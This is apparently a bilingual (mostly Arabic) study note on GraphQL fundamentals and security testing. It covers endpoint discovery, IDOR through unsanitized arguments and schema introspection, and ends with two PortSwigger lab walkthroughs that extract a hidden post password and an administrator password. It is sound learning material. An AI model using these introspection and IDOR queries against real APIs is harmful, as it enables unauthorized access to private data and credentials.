# GraphQL

<details>
  <summary>what is GraphQL?</summary>


- <details>
      <summary>what is GraphQL & How it work?</summary>

  ## 🧠 ما هو GraphQL؟
  
  **GraphQL** هو لغة استعلام API (بديلة عن REST) تسمح للعملاء بطلب البيانات التي يحتاجونها فقط، مما:
  - يقلل من حجم الاستجابات.
  - يمنع تعدد الطلبات للحصول على بيانات من أكثر من مصدر.
  
  ---
  
  ## ⚙️ كيف يعمل GraphQL؟
  
  - يعتمد على **Schema** يحدد أنواع البيانات والعلاقات بينها.
  - يستخدم **نقطة نهاية واحدة فقط** (عادة POST).
  - جميع العمليات (queries/mutations/subscriptions) تُرسل إلى نفس الـ endpoint.
  
  ---
  
  ## 🔧 أنواع العمليات في GraphQL:
  
  | النوع         | الوظيفة                                       |
  |---------------|-----------------------------------------------|
  | **Query**     | لجلب البيانات                                  |
  | **Mutation**  | لإضافة أو تعديل أو حذف البيانات                |
  | **Subscription** | لإنشاء اتصال دائم لتحديث البيانات تلقائيًا  |
  
  ---
  
  ## 🟢 مميزات GraphQL:
  
  - عميل التطبيق يحدد **ما هي البيانات المطلوبة بالضبط**.
  - لا حاجة لمعرفة مكان البيانات أو كيفية تجميعها.
  - متوافق مع مختلف لغات البرمجة وقواعد البيانات.
  - الاستجابة تأتي بشكل **JSON منظم حسب الطلب**.
  
  ---
  
  ## 🔁 الفرق عن REST:
  
  | REST                      | GraphQL                                   |
  |---------------------------|--------------------------------------------|
  | عدة endpoints             | endpoint واحد فقط                         |
  | HTTP methods (GET, POST…) | POST فقط غالبًا                           |
  | استجابة كاملة              | استجابة مخصصة حسب الطلب فقط              |
  
  


  </details>









- <details>
      <summary>What is a GraphQL schema?</summary>
  
  
  
  ## 📘 ما هو GraphQL Schema؟
  
  **GraphQL Schema** هو العقد (Contract) بين الـ **Frontend** والـ **Backend** يوضح:
  - ما هي البيانات المتاحة.
  - ما هي أنواعها.
  - كيف يمكن استدعاؤها.
  
  ✅ يُكتب باستخدام **لغة تعريف بسيطة ومقروءة (SDL)**.
  
  ---
  
  ## 🧱 ما الذي يحتويه الـ Schema؟
  
  - **أنواع البيانات (Types)**: مثل `Product`, `User`, `Order`...
  - **الحقول (Fields)**: تمثل خصائص الكائنات (مثل name، id...).
  - **الأنواع الأساسية**: مثل `String`, `Int`, `Boolean`, `ID`
  - يمكن أن تكون الحقول:
    - **Object Type** (نوع مركب)
    - **Scalar Type** (نوع بسيط)
    - **Enum / Union / Interface / Custom Types**
  
  🔒 `!` يعني أن الحقل **إجباري (Non-nullable)**
  
  ---
  
  ## ✏️ مثال على تعريف Schema بسيط:
  
  ```graphql
  type Product {
    id: ID!
    name: String!
    description: String!
    price: Int
  }
  ```
  
  #### 📌 هذا يعرف نوع اسمه Product يحتوي على:
  
  - ``id``: معرف فريد (إجباري)
  
  - ``name``: اسم المنتج (إجباري)
  
  - ``description``: وصف (إجباري)
  
  - ``price``: السعر (اختياري)
  
  
  ## 🔍 مكونات إضافية في الـ Schema:
  
  يجب أن يحتوي على Query واحدة على الأقل (لجلب البيانات)
  
  عادةً يحتوي أيضًا على Mutations (لإضافة/تعديل/حذف بيانات)
  
  
  ## 💡 ملخص سريع:
  
  | العنصر           | الوصف                                   |
  | ---------------- | --------------------------------------- |
  | Schema           | يحدد شكل البيانات وكيف يتم الوصول إليها |
  | Types            | الكائنات التي يمكن استرجاعها أو تعديلها |
  | Fields           | خصائص كل كائن (الاسم، السعر، إلخ)       |
  | Non-nullable (!) | حقل إجباري لا يمكن أن يكون فارغًا       |
  
  



  </details>








- <details>
     <summary>What are GraphQL queries?</summary>
  
  
  ## 🔍 ما هي GraphQL Queries؟
  
  **GraphQL Queries** تُستخدم لاسترجاع البيانات من قاعدة البيانات أو مصدر البيانات.
  
  ✅ تشبه طلبات **GET** في REST APIs، لكنها:
  - أكثر مرونة
  - تُعيد فقط البيانات التي تطلبها
  
  ---
  
  ## 🧱 مكونات الاستعلام (Query):
  
  | العنصر                 | الوصف                                               |
  |-------------------------|------------------------------------------------------|
  | **نوع العملية (query)** | لتوضيح أن الطلب هو استعلام (اختياري لكن مفضل)       |
  | **اسم الاستعلام**       | لتسهيل التتبع والتصحيح (اختياري لكنه مفضل)          |
  | **الهيكلية المطلوبة**   | تحدد الحقول التي تريد استرجاعها                     |
  | **المعاملات (arguments)** | لتحديد عناصر معينة بناءً على شرط (مثل ID)            |
  
  ---
  
  ## ✏️ مثال على Query:
  
  ```graphql
  query myGetProductQuery {
    getProduct(id: 123) {
      name
      description
    }
  }
  ```
  
  
  ### 📌 هذا الاستعلام يطلب من الخادم:
  
  المنتج الذي معرفه ``123``
  
  ويطلب فقط الاسم والوصف
  
   > 💡 ملاحظة: حتى لو كان نوع Product يحتوي على حقول أكثر، فأنت تتحكم في ما يتم استرجاعه فقط.
  
  
  
  
  ## 📚 ملخص سريع:
  
  
  
  | المفهوم      | القيمة                                          |
  | ------------ | ----------------------------------------------- |
  | الاستعلام    | طلب بيانات من الخادم                            |
  | يشبه في REST | طلب `GET`                                       |
  | المرونة      | تطلب الحقول التي تحتاجها فقط                    |
  | المعاملات    | تُستخدم لتحديد بيانات معينة مثل `id`, `name`... |
  
  


  </details>







- <details>
     <summary>What are GraphQL mutations?</summary>
  
  
  ## 🔧 ما هي GraphQL Mutations؟
  
  **Mutations** تُستخدم لتعديل البيانات، وتشمل:
  - الإضافة (Create)
  - التعديل (Update)
  - الحذف (Delete)
  
  🟩 تقابل في REST:
  - `POST` / `PUT` / `DELETE`
  
  ---
  
  ## 🧱 مكونات الـ Mutation:
  
  | العنصر                   | الوصف                                                         |
  |---------------------------|----------------------------------------------------------------|
  | **نوع العملية (mutation)**| يُحدد أن العملية هي تعديل بيانات                              |
  | **اسم العملية**           | (اختياري لكنه مفيد) لتسهيل التتبع                             |
  | **المدخلات (Inputs)**     | يجب تمرير بيانات (قيم) لإجراء التعديل                         |
  | **الاستجابة**             | تحدد الحقول التي تريد إرجاعها بعد التعديل                     |
  
  ---
  
  ## ✏️ مثال على Mutation:
  
  ```graphql
  mutation {
    createProduct(name: "Flamin' Cocktail Glasses", listed: "yes") {
      id
      name
      listed
    }
  }
  ```
  
  
  ### 📌 هذا يقوم بـ:
  
  - إنشاء منتج جديد
  
  - يطلب من الخادم إرجاع id, name, و listed في الاستجابة
  
  
  
  
  ---
  
  ## 📥 مثال على الاستجابة:
  
  ```json
  {
    "data": {
      "createProduct": {
        "id": 123,
        "name": "Flamin' Cocktail Glasses",
        "listed": "yes"
      }
    }
  }
  ```
  
  
  
  ## 📚 ملخص سريع:
  
  | المفهوم      | القيمة                                       |
  | ------------ | -------------------------------------------- |
  | الغرض        | تعديل البيانات (إضافة، تعديل، حذف)           |
  | يشبه في REST | POST / PUT / DELETE                          |
  | يجب أن يحتوي | مدخلات (inputs)                              |
  | الاستجابة    | تحدد الحقول المراد إرجاعها بعد تنفيذ العملية |
  
  
  
  
  
  

     
  </details>













- <details>
     <summary>Components of queries and mutations</summary>

  
  
  # 📌 Components of GraphQL Queries and Mutations
  
  GraphQL يتكوّن من عناصر أساسية تُستخدم لجلب البيانات (queries) أو تعديلها (mutations).
  
  ---
  
  ## 🔸 Fields (الحقول)
  
  - كل نوع (Type) يحتوي على **Fields** يمكن استدعاؤها.
  - يمكنك تحديد فقط الحقول المطلوبة في الطلب.
  - الاستجابة تعكس ما طلبته بالضبط.
  
  ### ✅ مثال:
  
  ```graphql
  query myGetEmployeeQuery {
    getEmployees {
      id
      name {
        firstname
        lastname
      }
    }
  }
  ```

  ## Response

  ```json
      #Response
  
      {
          "data": {
              "getEmployees": [
                  {
                      "id": 1,
                      "name" {
                          "firstname": "Carlos",
                          "lastname": "Montoya"
                      }
                  },
                  {
                      "id": 2,
                      "name" {
                          "firstname": "Peter",
                          "lastname": "Wiener"
                      }
                  }
              ]
          }
      }
  ```

  ---
  
  ## 🔸 Arguments (المعاملات)
  
  - تُستخدم لتمرير قيم إلى الاستعلام.
  - تُحدَّد في الـ Schema.
  - تُساعد على جلب بيانات محددة.
  
  ### ✅ مثال:
  
  ```graphql
  query myGetEmployeeQuery {
    getEmployees(id: 1) {
      name {
        firstname
        lastname
      }
    }
  }
  ```

  ## response
  
  ```json
   #Response to query
  
      {
          "data": {
              "getEmployees": [
              {
                  "name" {
                      "firstname": Carlos,
                      "lastname": Montoya
                      }
                  }
              ]
          }
      }
  ```






  
  📌 **تنبيه:** يمكن أن تكون عرضة لهجمات مثل **IDOR** إذا لم يتم تأمين الوصول جيدًا.
  
  ---
  
  ## 🔸 Variables (المتغيرات)
  
  - تُستخدم لتمرير قيم ديناميكية بدلاً من وضعها مباشرة في الاستعلام.
  - تفصل بين **هيكل الاستعلام** و**قيم البيانات**.
  
  ### ✅ مثال:
  
  ```graphql
 
    #Example query with variable

    query getEmployeeWithVariable($id: ID!) {
        getEmployees(id:$id) {
            name {
                firstname
                lastname
            }
         }
    }

    Variables:
    {
        "id": 1
    }
  ```
  
 
  
  ---
  
  ## 🔸 Aliases (الأسماء البديلة)
  
  - تسمح بطلب نفس النوع أكثر من مرة في نفس الاستعلام.
  - تتجاوز القيود بأن يكون لكل خاصية اسم فريد.
  
  ### ❌ استعلام غير صحيح:
  
  ```graphql
 
    #Invalid query

    query getProductDetails {
        getProduct(id: 1) {
            id
            name
        }
        getProduct(id: 2) {
            id
            name
        }
    }
  ```
  
  ### ✅ استعلام صحيح باستخدام Aliases:
  
  ```graphql
  query getProductDetails {
    product1: getProduct(id: "1") {
      id
      name
    }
    product2: getProduct(id: "2") {
      id
      name
    }
  }
  ```

  ## response

  ```json

    #Response to query

    {
        "data": {
            "product1": {
                "id": 1,
                "name": "Juice Extractor"
             },
            "product2": {
                "id": 2,
                "name": "Fruit Overlays"
            }
        }
    }
  ```
  
  ---
  
  ## 🔸 Fragments (الأجزاء القابلة لإعادة الاستخدام)
  
  - تُستخدم لتعريف مجموعة من الحقول مرة واحدة.
  - تُساعد في تقليل التكرار وإعادة استخدام نفس البنية في عدة أماكن.
  
  ### ✅ مثال:
  
  ```graphql
  fragment productInfo on Product {
    id
    name
    listed
  }
  
 
  ```

  ## query calling fragment
  
  ```graphql
   #Query calling the fragment
  
      query {
          getProduct(id: 1) {
              ...productInfo
              stock
          }
      }
  ```
  
  ## response 
  
  ```json
     #Response including fragment fields
  
      {
          "data": {
              "getProduct": {
                  "id": 1,
                  "name": "Juice Extractor",
                  "listed": "no",
                  "stock": 5
              }
          }
      }
  ```


 
  ---
  
  ## 📚 ملخص سريع:
  
  | المكون       | الوظيفة الرئيسية                                                              |
  |--------------|--------------------------------------------------------------------------------|
  | Fields        | تحديد ما يجب استرجاعه من بيانات                                                |
  | Arguments     | تمرير قيم لتحديد أو تخصيص البيانات المطلوبة                                    |
  | Variables     | فصل القيم عن الاستعلام لسهولة التكرار والتعديل                                 |
  | Aliases       | إرسال نفس الطلب لنوع معين أكثر من مرة باستخدام أسماء بديلة                    |
  | Fragments     | تعريف أجزاء قابلة لإعادة الاستخدام في استعلامات أو Mutations متعددة           |
  
  





  </details>




- <details>
     <summary>Subscriptions & Introspection</summary>


  # 🔄 GraphQL Subscriptions & Introspection
  
  ## 🔸 Subscriptions
  
  **Subscriptions** هي نوع خاص من الاستعلامات (queries)، لكن الفرق الرئيسي هو أنها:
  - تُنشئ **اتصال دائم** بين العميل (Client) والخادم (Server)
  - تُستخدم لتلقي **تحديثات لحظية (Real-time)** من السيرفر دون الحاجة للاستعلام بشكل مستمر
  
  ### ✅ الفائدة الأساسية:
  - مناسبة للتحديثات السريعة والصغيرة مثل:
    - تطبيقات الدردشة (Chat apps)
    - تحرير المحتوى التعاوني (مثل Google Docs)
    - الإشعارات المباشرة
  
  ### ⚙️ طريقة العمل:
  - غالبًا يتم تنفيذها باستخدام **WebSockets**
  - تُحدد شكل البيانات المطلوبة مثل الاستعلامات العادية
  
  ---
  
  ## 🔍 Introspection
  
  **Introspection** هي ميزة مدمجة في GraphQL تسمح لك بـ:
  - الاستعلام عن معلومات حول **الـ Schema** نفسها
  - معرفة أنواع البيانات، الحقول، الاستعلامات المتاحة، الـ mutations، وغيرها
  
  ### ✅ تُستخدم في:
  - أدوات مثل **GraphQL Playground** أو **GraphiQL**
  - توليد التوثيق (Documentation)
  
  ### ⚠️ مخاطر أمنية:
  - يمكن أن تكشف **معلومات حساسة** عن الـ API
  - يمكن أن تساعد المخترق في معرفة كيفية التفاعل مع الـ API
  - 🔒 **يُنصح بإيقافها في بيئات الإنتاج (Production)**
  
  ---
  
  ## 📚 ملخص سريع:
  
  | العنصر         | الوصف                                                                 |
  |----------------|------------------------------------------------------------------------|
  | Subscriptions  | اتصال دائم من السيرفر للعميل لتحديث البيانات لحظيًا                     |
  | Introspection  | استعلام عن هيكل الـ GraphQL نفسه (Schema)                              |
  | تستخدم في      | الدردشة، التحديثات اللحظية، توثيق GraphQL                               |
  | المخاطر        | Introspection قد تكشف تفاصيل داخلية حساسة - يجب تعطيلها في الإنتاج     |
  """
  

  </details>





  
</details>





<details>
  <summary>Finding GraphQL endpoints</summary>



# 🔍 Discovering & Testing GraphQL Endpoints

قبل اختبار أي GraphQL API، لازم تلاقي أولًا **الـ endpoint** الخاص بيها. كل طلبات GraphQL تروح لنفس الـ endpoint، فمعرفته مهمة جدًا.

---

## 🧪 Universal Query

### ما هو؟
استعلام بسيط لاختبار إذا كان عنوان URL يحتوي على GraphQL endpoint.

### ✅ مثال:
```graphql
query { __typename }
```

### 📥 الاستجابة المتوقعة:
```json
{
  "data": {
    "__typename": "query"
  }
}
```

🔎 هذا يساعدك تتأكد إنك بتتعامل مع GraphQL.

---

## 📍 Common GraphQL Endpoints

جرب ترسل universal query لهذه المسارات:

- `/graphql`
- `/api`
- `/api/graphql`
- `/graphql/api`
- `/graphql/graphql`
- (أحيانًا) أضف `/v1` في النهاية مثل: `/api/graphql/v1`

---

## 📬 طرق إرسال الطلبات (Request Methods)

| الطريقة       | الحالة                                      |
|---------------|----------------------------------------------|
| `POST` + `application/json` | ✅ الأفضل والأكثر أمانًا                  |
| `GET` أو `POST` + `x-www-form-urlencoded` | 🚫 ممكن تكون متاحة في بعض التطبيقات |

🔒 من الأفضل أن تقبل فقط POST + JSON لتفادي **CSRF**.

---

## 🧭 كيفية التأكد من الـ Endpoint

- جرب كل المسارات المعروفة باستخدام universal query.
- لو رجع استجابة بـ "query not present" أو شبيه، ده غالبًا GraphQL.
- غير طرق الطلب وشوف الاستجابة.

---

## 🧰 أدوات مساعدة

- **Burp Scanner**: بيقدر يكتشف GraphQL endpoints تلقائيًا.
  - يظهر إشعار "GraphQL endpoint found" لو تم اكتشافه.

- **Burp Proxy**:
  - استخدم المتصفح المدمج في Burp.
  - راقب HTTP History وشوف الطلبات اللي بيتم إرسالها.
  - كده تقدر تشوف استعلامات GraphQL الحقيقية في التطبيق.

---

## 📚 ملخص سريع:

| العنصر               | التوضيح                                                        |
|------------------------|----------------------------------------------------------------|
| Universal Query        | استعلام بسيط للتأكد من وجود GraphQL                          |
| Common Endpoints       | مسارات متكررة غالبًا تستخدمها الخدمات                        |
| طرق HTTP               | جرب POST + JSON أولًا، ثم طرق أخرى لو فشلت                    |
| أدوات الكشف           | Burp Suite مفيد جدًا في تحليل واستكشاف واجهات GraphQL         |


  
</details>










<details>
  <summary>Exploiting unsanitized arguments</summary>


  
  # ⚠️ Exploiting Unsanitized Arguments in GraphQL
  
  في مرحلة اختبار الأمان، من الجيد البدء باختبار **المعاملات (arguments)** داخل الاستعلامات. بعض التطبيقات تكون معرضة لثغرات **الوصول غير المصرح به** أو ما يُعرف بـ **IDOR**.
  
  ---
  
  ## ❗ ما هي ثغرة IDOR في GraphQL؟
  
  - تحدث عندما يُسمح للمستخدم بطلب كائن باستخدام معرف (ID) دون التأكد من صلاحياته.
  - المستخدم قد يصل إلى بيانات لا يملك إذنًا لرؤيتها فقط عن طريق تغيير قيمة الـ ID.
  
  ---
  
  ## 🎯 مثال عملي:
  
  ### 🔹 استعلام يعرض المنتجات المتاحة فقط:
  
  ```graphql
  query {
    products {
      id
      name
      listed
    }
  }
  ```
  
  ### 🔹 استجابة توضح المنتجات المتاحة فقط:
  
  ```json
  {
    "data": {
      "products": [
        { "id": 1, "name": "Product 1", "listed": true },
        { "id": 2, "name": "Product 2", "listed": true },
        { "id": 4, "name": "Product 4", "listed": true }
      ]
    }
  }
  ```
  
  📌 الملاحظة:
  - المنتج ذو ID رقم 3 غير ظاهر. من المحتمل أنه **غير مُدرج** أو محجوب.
  
  ---
  
  ## 🕵️‍♂️ محاولة الوصول للمنتج الغير ظاهر:
  
  ```graphql
  query {
    product(id: 3) {
      id
      name
      listed
    }
  }
  ```
  
  ### 🧨 استجابة غير متوقعة:
  
  ```json
  {
    "data": {
      "product": {
        "id": 3,
        "name": "Product 3",
        "listed": false
      }
    }
  }
  ```
  
  ✅ يعني أنه لا يوجد تحقق من صلاحيات المستخدم، وقدرنا نوصل لمنتج **غير ظاهر للعامة**.
  
  ---
  
  ## 🚨 الملخص:
  
  | العنصر              | التوضيح                                                  |
  |---------------------|-----------------------------------------------------------|
  | نوع الهجوم         | Insecure Direct Object Reference (IDOR)                   |
  | السبب              | عدم وجود تحقق من صلاحيات المستخدم عند استخدام المعاملات   |
  | النتيجة المحتملة   | الوصول إلى بيانات حساسة أو غير معلنة                      |
  | الطريقة            | تغيير قيمة الـ ID أو معلمة في الاستعلام يدويًا            |
  
  ---
  
  ## 🔐 التوصية للمطورين:
  
  - تأكد دائمًا من صلاحيات المستخدم قبل جلب الكائنات الحساسة.
  - لا تعتمد فقط على أن الاستعلام لا يُرجع البيانات في بعض الحالات.
  - راجع التحكم بالوصول (Access Control) بدقة.
  
  
  
    
</details>






<details>
  <summary>Discovering schema information</summary>




# 🧠 Discovering Schema Information in GraphQL

الخطوة التالية بعد الوصول لنقطة النهاية (endpoint) في GraphQL هي **اكتشاف معلومات المخطط (schema)** لفهم كيفية التفاعل مع الـ API.

---

## 🔍 ما هي Introspection؟

- Introspection هي ميزة مدمجة في GraphQL تتيح لك الاستعلام عن معلومات حول المخطط (schema).
- تُستخدم لفهم أنواع البيانات المتاحة، والاستعلامات (queries)، والتحويلات (mutations)، والاشتراكات (subscriptions)، وحتى الأوصاف الخاصة بها.

---

## ✨ فائدة Introspection

| الفائدة                         | التوضيح |
|--------------------------------|---------|
| فهم البنية الكاملة للـ API     | تعرف ما هي الأنواع والاستعلامات والحقول المتوفرة |
| كشف معلومات حساسة محتملة      | مثل الأوصاف أو الأسماء الداخلية التي لم تُنشر للعامة |
| تستخدمها أدوات التوثيق IDEs   | مثل GraphQL Playground و Postman و Burp Scanner |

---

## 🚀 استخدام introspection

### ✅ استعلام بسيط للتأكد من تفعيل introspection:

```json
{
  "query": "{__schema{queryType{name}}}"
}
```

📌 إذا استرجعت أسماء الاستعلامات، فإن introspection مفعلة.

---

## 📜 استعلام Introspection كامل

إذا أردت استخراج كل تفاصيل المخطط:

```graphql

    #Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            onOperation  #Often needs to be deleted to run query
            onFragment   #Often needs to be deleted to run query
            onField      #Often needs to be deleted to run query
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

🔧 ملاحظة: احذف `onOperation`, `onFragment`, `onField` إن ظهرت لك أخطاء.

---

## 📊 أدوات لتسهيل الفهم

- **GraphQL Visualizer**: يعرض علاقات المخطط بطريقة رسومية.
- **Burp Suite**: يمكنه توليد استعلام introspection واكتشاف التوجيهات والمخطط.
- **Clairvoyance**: أداة تقوم بجمع معلومات المخطط من **الاقتراحات** حتى لو كان introspection معطل.

---

## 💬 ماذا عن الاقتراحات؟

- تستخدم بعض الخوادم مثل Apollo GraphQL ميزة **الاقتراحات الذكية**.
- عند وجود خطأ بسيط في اسم الحقل، يقترح الاسم الصحيح.
- يمكن استغلال هذه الميزة لاستخراج المخطط جزئياً.

🔍 مثال:
> There is no entry for 'productInfo'. Did you mean 'productInformation'?

🛡️ لا يمكن تعطيل الاقتراحات مباشرةً في Apollo، ولكن هناك بعض الحيل في GitHub لتعطيلها.

---

## 📌 ملاحظات أمنية

| الجانب الأمني       | التوصية |
|---------------------|---------|
| introspection       | يجب تعطيله في بيئة الإنتاج |
| الاقتراحات          | تجنب تمكينها أو قم بفحص الردود بدقة |
| Burp Scanner        | يمكنه اختبار introspection والاقتراحات تلقائيًا |





  
</details>






































----
----


# **``GraphQL Labs``**



<details>
  <summary>Lab: Accessing private GraphQL posts</summary>

> ### The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 


---

1. active **``burp live passive Crawl``**

<img width="400" height="168" alt="image" src="https://github.com/user-attachments/assets/1aabdb2e-2be3-419d-8f5e-5cbbf23f341b" />

**``Found``**


```http
POST /graphql/v1 HTTP/2
Host: 0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
Cookie: session=6rY0h8IeXuTOu3Viib6k5KsJYOZNxku1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net/post?postId=2
Content-Type: application/json
Content-Length: 249
Origin: https://0a840000031c9eaf83cdf5c7001700fe.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers



{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n        }\n    }","operationName":"getBlogPost","variables":{"id":2}}
```


find introspection

simple one to check

<img width="1524" height="476" alt="image" src="https://github.com/user-attachments/assets/403cf877-4073-4ec6-becb-c926c3b227a0" />


> Don't forget to convert form ``graphql`` to ``json`` 

[From_graphql_2_json](https://datafetcher.com/graphql-json-body-converter)

```json
{

  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"

}
```

<img width="1570" height="723" alt="image" src="https://github.com/user-attachments/assets/3104cd2c-b626-4eae-9ff3-f741a7135f57" />


> ### put output to visulizer

[graphql_visulaize3r](http://nathanrandal.com/graphql-visualizer/)


<img width="848" height="657" alt="image" src="https://github.com/user-attachments/assets/40ebcb57-fe05-4ba5-906c-31ec3f82fb39" />


Try to read content of ``postPassword`` of all posts

```graphql
query {
  getAllBlogPosts {
    id
    title
    postPassword
  }
}
```

but if you notice that there ar id form ``1`` to ``5`` exept **``3``** this might be it's ``isPrivate: Boolean!`` is true

<img width="1527" height="622" alt="image" src="https://github.com/user-attachments/assets/6546c0c4-2f1a-4cac-990c-05e145d21c22" />

so if i use the first query and try to see password 

```json
{"query":"\n    query getBlogPost($id: Int!) {\n        getBlogPost(id: $id) {\n            image\n            title\n            author\n            date\n            paragraphs\n     postPassword\n   }\n    }","operationName":"getBlogPost","variables":{"id":3

}}
```

<img width="1544" height="651" alt="image" src="https://github.com/user-attachments/assets/e689a70d-8315-4412-9c87-b8d5aa85efd6" />


found the password

```

```

  
</details>









<details>
  <summary>Lab: Accidental exposure of private GraphQL fields</summary>


### > The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

> To solve the lab, sign in as the administrator and delete the username ``carlos``. 

---

find this request 

<img width="1211" height="602" alt="image" src="https://github.com/user-attachments/assets/ce5ced22-73f4-416f-835a-effedd00e716" />

``Introspection Query``

```json
{

  "query": " query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"

}
```

``Introspection Result``

<img width="1540" height="640" alt="image" src="https://github.com/user-attachments/assets/07d67e10-15c5-4b3a-95a9-5a60b4b257f7" />

<img width="843" height="720" alt="image" src="https://github.com/user-attachments/assets/acca9c26-a639-4f12-8c97-1b4b5edcd8de" />

now try to use ``getUser(id:Int!): User`` to find **``administrator``** user


```graphql
{
  getUser(id: 1) {
    id
    username
    password
  }
}

```

<img width="1316" height="367" alt="image" src="https://github.com/user-attachments/assets/e932fd39-cead-4b3d-9c44-3ae3474b1329" />


```
administrator : lnqajgkwlru628r4sgjc
```

<img width="1330" height="486" alt="image" src="https://github.com/user-attachments/assets/4ed941d2-305e-4e47-8b02-58d16d623fb2" />

<img width="1290" height="268" alt="image" src="https://github.com/user-attachments/assets/89d700e2-75c7-4ab1-8c53-441c2c82b3fe" />


  
</details>








































